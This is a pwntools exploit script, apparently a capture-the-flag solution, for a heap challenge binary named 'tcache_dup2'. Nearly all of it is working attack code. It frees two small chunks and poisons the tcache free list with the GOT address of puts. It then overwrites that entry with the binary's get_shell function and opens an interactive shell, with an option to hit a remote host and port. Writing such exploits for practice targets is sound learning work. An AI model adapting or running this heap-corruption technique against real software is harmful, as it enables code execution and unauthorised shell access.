from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './tcache_dup2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = elf.libc

index = 0
def create(size, content):
    global index
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendlineafter(b"Data: ", content)
    index += 1
    return index -1
def modify(index,size, content):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendlineafter(b"Data: ", content)
def delete(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(index).encode())

create(0x18, b'a')
create(0x18, b'a')
delete(0)
delete(1)
modify(1, 0x8, p64(elf.got['puts']))
create(0x18, b'a')
create(0x18, p64(elf.symbols['get_shell']))
p.interactive()
